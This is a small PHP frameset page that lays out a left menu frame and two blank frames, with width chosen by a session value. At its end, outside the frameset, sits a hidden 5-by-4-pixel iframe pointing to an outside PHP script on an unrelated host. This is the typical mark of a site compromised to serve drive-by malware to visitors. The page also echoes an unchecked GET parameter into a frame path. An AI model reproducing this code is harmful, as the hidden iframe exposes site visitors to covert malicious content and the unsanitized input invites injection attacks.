<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');

$id_sel=$_GET['id_sel'];

$socio=$_SESSION['socio'];

if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

?>

<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<frameset name='marcos' cols="140,*,<?=$anchof?>" frameborder="no" border="0" framespacing="0">
	<frame src="./tmp_menues/sub_<?=$id_sel?>.php" name="izquierda" scrolling="NO" noresize>
	<frame src="_blank.htm" name="centro" scrolling="auto">
	<frame src="_blank.htm" name="derecha" scrolling="NO" noresize>
</frameset>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></noframes>
</html>
